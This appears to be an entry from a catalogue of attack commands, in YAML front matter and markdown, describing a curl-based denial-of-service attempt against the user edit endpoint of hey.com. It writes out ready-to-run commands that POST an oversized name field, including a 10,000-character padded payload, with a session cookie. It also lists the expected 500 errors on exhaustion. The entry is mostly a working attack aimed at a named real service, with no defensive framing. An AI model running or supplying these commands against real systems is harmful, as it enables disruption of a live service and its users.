---
id: cmd-uuid-1
data: >-
  curl -X POST -d "name=$(cat name.txt)"
  https://app.hey.com/contacts/%user_id_number%/user/edit -H "Cookie:
  your_session_cookie" -H "Content-Type: application/x-www-form-urlencoded"
tags:
  - dos
  - web-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:56.432Z'
verified: false
validated: true
submitted: true
---
# curl-submit-long-username

## Command

```bash
curl -X POST -d "name=$(cat name.txt)" https://app.hey.com/contacts/%user_id_number%/user/edit -H "Cookie: your_session_cookie" -H "Content-Type: application/x-www-form-urlencoded"
```

## Description

This curl command submits a POST request to the hey.com user edit endpoint with an oversized name from a file, exploiting lack of input validation to trigger DoS effects.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-d "name=$(cat name.txt)"` | Payload with long name from file | Yes |
| `https://app.hey.com/contacts/%user_id_number%/user/edit` | Target endpoint URL | Yes |
| `-H "Cookie: your_session_cookie"` | Authentication header | Yes |
| `-H "Content-Type: application/x-www-form-urlencoded"` | Form data type | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d "name=VeryLongStringFromFile" https://app.hey.com/contacts/123/user/edit -H "Cookie: session=abc123"
```

### Advanced Usage

```bash
curl -X POST -d "name=$(head -c 10000 < /dev/zero | tr '\0' 'A')" https://app.hey.com/contacts/123/user/edit -H "Cookie: session=abc123" -v
```

## Expected Output

HTTP 200 OK on success with update confirmation, or 500 Internal Server Error on exhaustion. Verbose mode (-v) shows headers and response body indicating processing issues.

## Related

- [[Related Procedure|Set-Excessively-Long-Username]]
